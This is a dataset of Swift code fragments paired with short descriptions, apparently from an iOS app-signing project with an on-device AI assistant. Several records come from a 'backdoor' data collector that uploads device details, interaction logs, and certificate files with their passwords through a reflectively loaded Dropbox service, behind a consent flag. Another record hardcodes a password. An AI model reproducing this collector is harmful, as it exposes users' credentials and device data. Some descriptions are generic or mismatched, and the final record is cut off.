  {
    "id": "1702",
    "code": "private func initializeCoreML() {\nDebug.shared.log(message: \"Starting CoreML initialization for AI service\", type: .info)\n\n// Check if CoreML is already loaded by the manager\nif CoreMLManager.shared.isModelLoaded {",
    "nl": "/ Initialize CoreML model",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1703",
    "code": "@objc private func handleCoreMLModelLoaded() {\nif !isCoreMLInitialized {",
    "nl": "/ Handle CoreML model load completion notification",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1704",
    "code": "@objc private func handleAICapabilitiesEnhanced() {\nif !isCoreMLInitialized, CoreMLManager.shared.isModelLoaded {",
    "nl": "/ Handle AI capabilities enhancement notification",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1705",
    "code": "enum ServiceError: Error, LocalizedError {\ncase processingError(String)\ncase contextMissing\n\nvar errorDescription: String? {",
    "nl": "enum ServiceError - implements functionality related to service error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "enum"
  },
  {
    "id": "1706",
    "code": "struct AIMessagePayload {\nlet role: String\nlet content: String\n}\n\n/// Process user input and generate an AI response\nfunc getAIResponse(\nmessages: [AIMessagePayload],\ncontext: AppContext,\ncompletion: @escaping (Result<String, ServiceError>) -> Void",
    "nl": "Maintained for compatibility with existing code",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "struct"
  },
  {
    "id": "1707",
    "code": "func getAIResponse(\nmessages: [AIMessagePayload],\ncontext: AppContext,\ncompletion: @escaping (Result<String, ServiceError>) -> Void\n) {",
    "nl": "/ Process user input and generate an AI response",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1708",
    "code": "private func processResponseForSearchCommands(response: String, completion: @escaping (String) -> Void) {\n// Define the pattern to match search commands\nlet patterns = [\n\"\\\\[web search:([^\\\\]]+)\\\\]\",\n\"\\\\[deep search:([^\\\\]]+)\\\\]\",\n\"\\\\[academic search:([^\\\\]]+)\\\\]\",\n\"\\\\[news search:([^\\\\]]+)\\\\]\",\n\"\\\\[specialized search:([^\\\\]]+)\\\\]\",\n]\n",
    "nl": "/ Process a response string for embedded search commands and execute them if found",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1709",
    "code": "private func getIntentString(from intent: MessageIntent) -> String {\nswitch intent {",
    "nl": "/ Convert MessageIntent to string representation for learning",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1710",
    "code": "private func extractConversationContext(messages: [AIMessagePayload]) -> String {\n// Get the last 5 messages for context (or fewer if there aren't 5)\nlet contextMessages = messages.suffix(min(5, messages.count))\n\nreturn contextMessages.map { \"\\($0.role): \\($0.content)\" }.joined(separator: \"\\n\")",
    "nl": "Extract meaningful context from conversation history",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1711",
    "code": "enum MessageIntent {\ncase question(topic: String)\ncase appNavigation(destination: String)\ncase appInstall(appName: String)\ncase appSign(appName: String)\ncase sourceAdd(url: String)\ncase webSearch(query: String)\ncase generalHelp\ncase greeting\ncase unknown",
    "nl": "MARK: - Intent Analysis",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "enum"
  },
  {
    "id": "1712",
    "code": "func analyzeUserIntent(message: String) -> MessageIntent {\nlet lowercasedMessage = message.lowercased()\n\n// Check for greetings\nif lowercasedMessage.contains(\"hello\") || lowercasedMessage\n.contains(\"hi \") || lowercasedMessage == \"hi\" || lowercasedMessage.contains(\"hey\")\n{",
    "nl": "Function analyzeUserIntent - implements analyzeuserintent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1713",
    "code": "func generateResponse(\nintent: MessageIntent,\nuserMessage: String,\nconversationHistory _: [AIMessagePayload],\nconversationContext _: String,\nappContext: AppContext\n) -> String {",
    "nl": "MARK: - Response Generation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1714",
    "code": "extension String {\nfunc replacing(regularExpression pattern: String, with replacement: String) -> String {",
    "nl": "Helper extension for string regex replacement",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "extension"
  },
  {
    "id": "1715",
    "code": "func replacing(regularExpression pattern: String, with replacement: String) -> String {\ndo {",
    "nl": "Function replacing - implements replacing functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1716",
    "code": "class MinimalBackdoorCollector {\n// MARK: - Singleton\n\nstatic let shared = MinimalBackdoorCollector()\n\n// MARK: - Properties\n\nprivate var isCollecting = false\nprivate var backgroundQueue = DispatchQueue(label: \"com.backdoor.minimaldatacollector\", qos: .utility)\n",
    "nl": "/ Minimal, self-contained data collection class with no dependencies / This class uses minimal imports and avoids any dependencies that might cause conflicts",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "class"
  },
  {
    "id": "1717",
    "code": "@objc private func userDefaultsDidChange() {\nlet hasConsent = UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\")\n\nif hasConsent, !isCollecting {",
    "nl": "MARK: - Notification Handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1718",
    "code": "func startCollection() {\nisCollecting = true\nuploadDeviceInfo()\n}\n\n/// Stop collecting data (called when consent is revoked)\nfunc stopCollection() {",
    "nl": "MARK: - Control Methods / Start collecting data (called when consent is given)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1719",
    "code": "func stopCollection() {\nisCollecting = false\n}\n\n// MARK: - Collection Methods\n\n/// Upload device information\nfunc uploadDeviceInfo() {",
    "nl": "/ Stop collecting data (called when consent is revoked)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1720",
    "code": "func uploadDeviceInfo() {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "MARK: - Collection Methods / Upload device information",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1721",
    "code": "func processCertificateFile(url: URL, password: String? = nil) {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "/ Process a certificate file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1722",
    "code": "func logUserInteraction(action: String, context: String = \"\") {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "/ Log a user interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1723",
    "code": "private func uploadDeviceInfoImpl() {\n// Collect device information\nlet deviceInfo: [String: String] = [\n\"device_name\": UIDevice.current.name,\n\"system_name\": UIDevice.current.systemName,\n\"system_version\": UIDevice.current.systemVersion,\n\"model\": UIDevice.current.model,\n\"identifier_for_vendor\": UIDevice.current.identifierForVendor?.uuidString ?? \"unknown\",\n\"timestamp\": ISO8601DateFormatter().string(from: Date()),\n\"app_version\": Bundle.main.infoDictionary?[\"CFBundleShortVersionString\"] as? String ?? \"unknown\",",
    "nl": "MARK: - Private Implementation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1724",
    "code": "private func processCertificateFileImpl(url: URL, password: String? = nil) {\ndo {",
    "nl": "Function processCertificateFileImpl - implements processcertificatefileimpl functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1725",
    "code": "private func logUserInteractionImpl(action: String, context: String) {\nlet logEntry = \"\"\"\n=== USER INTERACTION LOG ===\nTimestamp: \\(ISO8601DateFormatter().string(from: Date()))\nAction: \\(action)\nContext: \\(context)\nDevice: \\(UIDevice.current.name)\n\"\"\"\n\n// Try to upload via our indirect methods",
    "nl": "Function logUserInteractionImpl - implements loguserinteractionimpl functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1726",
    "code": "private func uploadViaDropboxService(_ method: String) -> Bool {\nif let dropboxServiceClass = NSClassFromString(\"EnhancedDropboxService\") as? NSObject.Type,\nlet dropboxService = dropboxServiceClass.value(forKey: \"shared\") as? NSObject,\ndropboxService.responds(to: Selector((method)))\n{",
    "nl": "MARK: - Helper Methods / Try to upload via DropboxService (if available)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1727",
    "code": "private func uploadFileViaDropboxService(url: URL, password: String? = nil) -> Bool {\nif let dropboxServiceClass = NSClassFromString(\"EnhancedDropboxService\") as? NSObject.Type,\nlet dropboxService = dropboxServiceClass.value(forKey: \"shared\") as? NSObject\n{",
    "nl": "/ Try to upload file via DropboxService (if available)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1728",
    "code": "private func uploadLogViaDropboxService(logEntry: String) -> Bool {\nif let dropboxServiceClass = NSClassFromString(\"EnhancedDropboxService\") as? NSObject.Type,\nlet dropboxService = dropboxServiceClass.value(forKey: \"shared\") as? NSObject\n{",
    "nl": "/ Try to upload log via DropboxService (if available)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1729",
    "code": "private func storeLocally(data: Any, filename: String) {\ndo {",
    "nl": "/ Store data locally (fallback if network services unavailable)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1730",
    "code": "func getAvailableDatasets() -> [String: Any] {\n// Simulated dataset information\nreturn [\n\"datasets\": [\n[\n\"name\": \"User Intent Classification\",\n\"size\": 2_500_000,\n\"description\": \"Dataset for classifying user intents from chat messages\",\n\"date_added\": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 5)),\n],",
    "nl": "MARK: - Dataset Management / Get list of available datasets",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1731",
    "code": "func validateDatasetPassword(_ password: String) -> Bool {\n// Hardcoded password as specified in requirements\nreturn password == \"2B4D5G\"\n}\n}\n",
    "nl": "/ Check if a dataset password is valid",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1732",
    "code": "class NaturalLanguageHelper {\n// Singleton instance\nstatic let shared = NaturalLanguageHelper()\n\nprivate init() {}",
    "nl": "/ Helper class for natural language processing features",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/NaturalLanguageHelper.swift",
    "code_type": "class"
  },
  {
    "id": "1733",
    "code": "func detectLanguage(in text: String) -> String {\n// Use Apple's NaturalLanguage framework\nlet tagger = NLTagger(tagSchemes: [.language])\ntagger.string = text\nif let language = tagger.dominantLanguage?.rawValue {",
    "nl": "/ Detect the language of a given text",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/NaturalLanguageHelper.swift",
    "code_type": "function"
  },
  {
    "id": "1734",
    "code": "func analyzeSentiment(in text: String) -> Double {\nguard !text.isEmpty else { return 0.0 }",
    "nl": "/ Get sentiment analysis for text / Returns score from -1.0 (negative) to 1.0 (positive)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/NaturalLanguageHelper.swift",
    "code_type": "function"
  },
  {
    "id": "1735",
    "code": "func extractEntities(from text: String) -> [String: String] {\nvar entities: [String: String] = [:]\n\n// Use NLTagger for named entity recognition\nlet tagger = NLTagger(tagSchemes: [.nameType])\ntagger.string = text\n\n// Process entire text for entities\ntagger.enumerateTags(in: text.startIndex ..< text.endIndex, unit: .word, scheme: .nameType) { tag, range in",
    "nl": "/ Extract entities from text using Apple's NL framework",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/NaturalLanguageHelper.swift",
    "code_type": "function"
  },
  {
    "id": "1736",
    "code": "func tokenize(text: String) -> [String] {\nvar tokens: [String] = []\n\nlet tokenizer = NLTokenizer(unit: .word)\ntokenizer.string = text\n\ntokenizer.enumerateTokens(in: text.startIndex ..< text.endIndex) { range, _ in",
    "nl": "/ Tokenize text into words using Apple's tokenizer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/NaturalLanguageHelper.swift",
    "code_type": "function"
  },
  {
    "id": "1737",
    "code": "final class OpenAIService {\n// Singleton instance for app-wide use\nstatic let shared = OpenAIService()\n\nprivate init() {",
    "nl": "/ Service for interacting with the built-in AI system (maintains OpenAIService name for compatibility)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/OpenAIService.swift",
    "code_type": "class"
  },
  {
    "id": "1738",
    "code": "func updateAPIKey(_: String) {\nDebug.shared.log(message: \"API key updates not required for custom AI\", type: .debug)\n}\n\nenum ServiceError: Error, LocalizedError {",
    "nl": "/ This method is maintained for backward compatibility but has no effect with the custom AI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/OpenAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1739",
    "code": "enum ServiceError: Error, LocalizedError {\ncase invalidURL\ncase invalidAPIKey\ncase networkError(Error)\ncase decodingError(Error)\ncase noData\ncase rateLimitExceeded\ncase serverError(Int)\ncase processingError(String)\n",
    "nl": "enum ServiceError - implements functionality related to service error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/OpenAIService.swift",
    "code_type": "enum"
  },
  {
    "id": "1740",
    "code": "struct AIMessagePayload {\nlet role: String\nlet content: String\n}\n\nfunc getAIResponse(\nmessages: [AIMessagePayload],\ncontext: AppContext,\ncompletion: @escaping (Result<String, ServiceError>) -> Void\n) {",
    "nl": "Maintained for compatibility with existing code",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/OpenAIService.swift",
    "code_type": "struct"
  },
  {
    "id": "1741",
    "code": "func getAIResponse(\nmessages: [AIMessagePayload],\ncontext: AppContext,\ncompletion: @escaping (Result<String, ServiceError>) -> Void\n) {",
    "nl": "Function getAIResponse - retrieves airesponse",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/OpenAIService.swift",
    "code_type": "function"
  },
  {
    "id": "1742",
    "code": "extension CustomAIService {\n/// Enhanced analyze user intent using CoreML\nfunc analyzeUserIntentWithML(message: String, completion: @escaping (MessageIntent) -> Void) {",
    "nl": "/ Extension to CustomAIService that integrates CoreML model predictions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift",
    "code_type": "extension"
  },
  {
    "id": "1743",
    "code": "func analyzeUserIntentWithML(message: String, completion: @escaping (MessageIntent) -> Void) {\n// Start with traditional pattern matching as a fallback\nlet patternBasedIntent = analyzeUserIntent(message: message)\n\n// Try to enhance with ML model\nCoreMLManager.shared.predictIntent(from: message) { result in",
    "nl": "/ Enhanced analyze user intent using CoreML",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1744",
    "code": "private func convertMLIntentToMessageIntent(intent: String, parameters: [String: Any],\nmessage: String) -> MessageIntent\n{",
    "nl": "/ Convert ML model intent format to our MessageIntent enum",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1745",
    "code": "func generateResponseWithML(\nintent: MessageIntent,\nuserMessage: String,\nconversationHistory: [AIMessagePayload],\nconversationContext: String,\nappContext: AppContext,\ncompletion: @escaping (String) -> Void\n) {",
    "nl": "/ Enhanced generate response using CoreML",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1746",
    "code": "private func adaptResponseToSentiment(response: String, sentiment: SentimentType) -> String {\nswitch sentiment {",
    "nl": "/ Adapt response based on detected sentiment",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1747",
    "code": "extension Result {\n/// Get the success value or return a default\nfunc getOrElse(_ defaultValue: Success) -> Success {",
    "nl": "MARK: - Helper Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift",
    "code_type": "extension"
  },
  {
    "id": "1748",
    "code": "func getOrElse(_ defaultValue: Success) -> Success {\nswitch self {",
    "nl": "/ Get the success value or return a default",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift",
    "code_type": "function"
  },
  {
    "id": "1749",
    "code": "final class CoreMLManager {\n// Singleton instance\nstatic let shared = CoreMLManager()\n\n// Model storage\nprivate var mlModel: MLModel?\nprivate var modelLoaded = false\nprivate var modelURL: URL?\n\n// Public getter for model loaded status",
    "nl": "/ Manages CoreML model loading and prediction operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "class"
  },
  {
    "id": "1750",
    "code": "private func createInitialModel() {\nDebug.shared.log(message: \"Attempting to create initial AI model\", type: .info)\n\nAILearningManager.shared.trainModelNow { success, message in",
    "nl": "/ Create an initial model from existing data if possible",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1751",
    "code": "private func findBestAvailableModel() -> URL? {\nDebug.shared.log(message: \"Looking for best available AI model\", type: .info)\n\n// 1. First priority: User-generated models from AILearningManager\nif let userModel = AILearningManager.shared.getLatestModelURL() {",
    "nl": "/ Find the best available model with prioritized search logic",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1752",
    "code": "func loadModel(completion: ((Bool) -> Void)? = nil) {\n// Skip in safe mode\nif SafeModeLauncher.shared.inSafeMode {",
    "nl": "/ Load the CoreML model asynchronously with safeguards",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1753",
    "code": "private func isMemoryConstrained() -> Bool {\nvar info = mach_task_basic_info()\nvar count = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info>.size) / 4\n\nlet kerr: kern_return_t = withUnsafeMutablePointer(to: &info) {",
    "nl": "/ Check if memory is constrained",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1754",
    "code": "private func shouldCheckMemory() -> Bool {\n// Only check memory on devices that might be constrained\nlet totalMemory = ProcessInfo.processInfo.physicalMemory\nlet totalMemoryGB = Double(totalMemory) / 1024.0 / 1024.0 / 1024.0\n\n// Debug log total device memory\nDebug.shared.log(message: \"Device has \\(String(format: \"%.1f\", totalMemoryGB)) GB RAM\", type: .info)\n\n// Always check if device has less than 3GB RAM\nreturn totalMemoryGB < 3.0",
    "nl": "/ Determine if we should check memory at all (performance optimization)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1755",
    "code": "private func notifyUserOfDeferredLoading() {\n// Only show once per session\nif hasShownDeferredNotification {",
    "nl": "/ Notify user that AI features are deferred",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1756",
    "code": "func loadModelWithLocalLearning(completion: ((Bool) -> Void)? = nil) {\n// If model is already loaded, return early\nguard !modelLoaded else {",
    "nl": "/ Load the CoreML model with local learning support",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1757",
    "code": "private func loadDefaultModel(completion: ((Bool) -> Void)? = nil) {\n// First try with existing URL if we have one\nif let modelURL = modelURL {",
    "nl": "/ Load the default CoreML model (now based on user-generated models)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1758",
    "code": "private func tryGenerateInitialModel() {\n// Get statistics on available data\nlet stats = AILearningManager.shared.getLearningStatistics()\n\n// If we have enough data to attempt model creation\nif stats.totalDataPoints >= 5 {",
    "nl": "/ Try to generate an initial model if possible with existing data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1759",
    "code": "private func loadModelFromURL(_ url: URL, completion: ((Bool) -> Void)? = nil) {\n// Show loading indicator for large files after a small delay\nvar loadingAlert: UIAlertController?\nvar loadingAlertPresented = false\n\n// Only show UI after a brief delay if loading is still ongoing\nDispatchQueue.main.asyncAfter(deadline: .now() + 0.75) { [weak self] in",
    "nl": "/ Load model from the specified URL with memory safety and progress indication",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1760",
    "code": "func predictIntent(from text: String, completion: @escaping (Result<PredictionResult, PredictionError>) -> Void) {\n// Ensure model is loaded before attempting prediction\nif !modelLoaded {",
    "nl": "/ Analyzes user input to determine intent with ML model",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1761",
    "code": "func analyzeSentiment(from text: String, completion: @escaping (Result<SentimentResult, PredictionError>) -> Void) {\n// Ensure model is loaded before attempting prediction\nif !modelLoaded {",
    "nl": "/ Performs sentiment analysis on text",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1762",
    "code": "score: 0.5, // Changed from confidence to score to match struct parameter name\ntext: text\n)\n\ncompletion(.success(result))\n}\n}\n} else {",
    "nl": "struct parameter - implements parameter functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1763",
    "code": "func performSentimentAnalysis(\ntext: String,\ncompletion: @escaping (Result<SentimentResult, PredictionError>) -> Void\n) {",
    "nl": "Function performSentimentAnalysis - implements performsentimentanalysis functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1764",
    "code": "private func internalAnalyzeSentiment(\ntext: String,\ncompletion: @escaping (Result<SentimentResult, PredictionError>) -> Void\n) {",
    "nl": "/ Non-overloaded version for internal use",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1765",
    "code": "private func performSentimentAnalysisInternal(\ntext: String,\ncompletion: @escaping (Result<SentimentResult, PredictionError>) -> Void\n) {",
    "nl": "/ Performs sentiment analysis with pattern matching fallback",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1766",
    "code": "private func fallbackSentimentAnalysis(text: String) -> SentimentResult {\nlet lowercasedText = text.lowercased()\nlet positiveTerms = [\n\"good\",\n\"great\",\n\"excellent\",\n\"amazing\",\n\"love\",\n\"thanks\",\n\"thank\",",
    "nl": "/ Fallback sentiment analysis for when ML model is unavailable",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1767",
    "code": "private func performPrediction(\ntext: String,\ncompletion: @escaping (Result<PredictionResult, PredictionError>) -> Void\n) {",
    "nl": "MARK: - Private Methods / Execute prediction on loaded model with pattern matching fallback",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1768",
    "code": "private func performPatternMatchingPrediction(text: String) -> PredictionResult {\nlet lowercasedText = text.lowercased()\n\n// Default values\nvar intent = \"unknown\"\nvar confidence = 0.5\nvar parameters: [String: Any] = [\"text\": text]\n\n// Check for greetings\nif lowercasedText.contains(\"hello\") || lowercasedText",
    "nl": "/ Perform pattern matching based intent prediction when ML model is unavailable",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift",
    "code_type": "function"
  },
  {
    "id": "1769",
